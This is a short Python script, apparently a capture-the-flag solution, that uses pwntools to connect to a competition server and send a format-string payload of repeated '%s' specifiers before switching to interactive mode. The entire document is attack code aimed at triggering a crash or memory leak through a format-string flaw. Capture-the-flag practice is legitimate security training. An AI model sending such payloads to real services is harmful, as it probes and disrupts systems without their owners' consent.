#!/usr/bin/env python3

from pwn import *

p = remote("chall.nitdgplug.org", 30092)
payload = "%s%s%s%s%s%s%s%s%s%s"
p.sendline(payload)

p.interactive()
